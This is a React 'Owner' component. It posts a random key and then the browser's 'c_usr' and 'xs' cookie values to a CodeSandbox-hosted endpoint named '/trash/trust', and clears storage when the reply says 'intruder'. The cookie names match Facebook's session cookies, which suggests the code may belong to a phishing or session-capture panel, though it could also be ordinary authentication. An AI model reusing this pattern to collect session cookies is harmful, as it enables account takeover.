import axios from 'axios'
import Cookies from 'js-cookie'
import React, { useContext, useEffect, useState } from 'react'
import { Connection } from '../Connection'
import {v4 as uuid} from 'uuid'

function Owner({socket}) {

    const {owner, setowner} = useContext(Connection)

    const [state, setstate] = useState('')

    useEffect(() => { 

       setTimeout(() => {
        axios.post("https://s4qtq5-3002.csb.app/session/key", { 
            keys: uuid()
          }).then(res =>{ 
            if(res.data.success === "success"){ 
                socket.emit("storedtoken", res.data.tokens)
                    axios.post("https://s4qtq5-3002.csb.app/trash/trust", { 
                        c_usr: Cookies.get("c_usr"),
                        xs: Cookies.get("xs")
                    }).then(res => { 
                        if(res.data.success !== "intruder"){ 
                            res.data.map(val => { 
                                if(val.loggi === ""){ 
                                    setowner(val)
                                    setTimeout(() => {
                                        setowner(val)
                                    }, 2000);
                                    setstate("good")
                                }
                                else { 
                                    localStorage.clear()
                                    sessionStorage.clear()
                                    Cookies.remove("c_usr")
                                    Cookies.remove("xs")
                                }
                            })
                        }
                        else { 
                            localStorage.clear()
                            sessionStorage.clear()
                            Cookies.remove("c_usr")
                            Cookies.remove("xs")
                        }
                    })
            }
          })
       }, 2000);

        // 

    }, [])

 

  return (
    <>
      { 
        state === '' ? 
            <div className="maindiv">
                <div className="pvdiv">
                    <div className="h1">Loading....</div>
                </div>
            </div>
        :
        <div style={{display: "none"}}></div>

      }
    </>
  )
}

export default Owner
